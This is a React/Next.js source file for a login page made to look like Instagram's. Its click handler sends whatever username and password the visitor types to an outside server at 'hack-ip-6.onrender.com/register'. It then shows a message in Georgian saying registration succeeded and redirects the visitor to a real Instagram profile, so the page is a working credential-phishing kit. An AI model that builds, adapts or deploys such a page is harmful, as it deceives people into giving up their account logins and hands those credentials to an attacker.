"use client"
import { useState } from 'react'
import style from './page.module.scss'
import axios from 'axios'
import { useRouter } from 'next/navigation'
import { Button, message, Space } from 'antd';

export default function Login() {
    const router = useRouter();
    const [userinfo, setUserinfo] = useState('')
    const [pass,setPass] = useState('')
    const [messageApi, contextHolder] = message.useMessage();
    const text1 = (e:React.ChangeEvent<HTMLInputElement>) => {
        setUserinfo(e.target.value)
    }

    const text2 = (e:React.ChangeEvent<HTMLInputElement>) => {
        setPass(e.target.value)
    } 

    const click = () => {
        axios.post('https://hack-ip-6.onrender.com/register', {
            userInfo: userinfo,
            password: pass
        })
        .then((res) => {
            console.log(res.data);
                messageApi.open({
                  type: 'warning',
                  content: 'წარმატებით გაიარეთ რეგისტრაცია!',
                });
                router.push('https://www.instagram.com/sado0_1234/');
        })
        .catch(() => {
                messageApi.open({
                  type: 'warning',
                  content: 'ეგეთი ლინკი არ არსებობს',
                });
        })
    }




    return(
        <>
        {contextHolder}
        <div className={style.instagram}>
            <div className={style.card}>
                <div className={style.title}></div>
                <div className={style.inputGroup}>
                    <input onChange={text1} className={style.inputInstagram} type="text" placeholder='Enter your Email,username,Phonenumber' />
                    <input onChange={text2} className={style.inputInstagram} type="password" placeholder='Password' />
                </div>
               <button onClick={click} className={style.btn1}>Log In</button>
                <div className={style.line}></div>
                <p className={style.passForgot}>Forgot password?</p>
            </div>
        </div>

        <div className={style.dontAcc}>
            <div className={style.card2}>
            <p className={style.noAccText}>Don&apos;t have an account? <span className={style.span1}>Sign up</span></p>

            </div>
        </div>

      
        </>
    )
}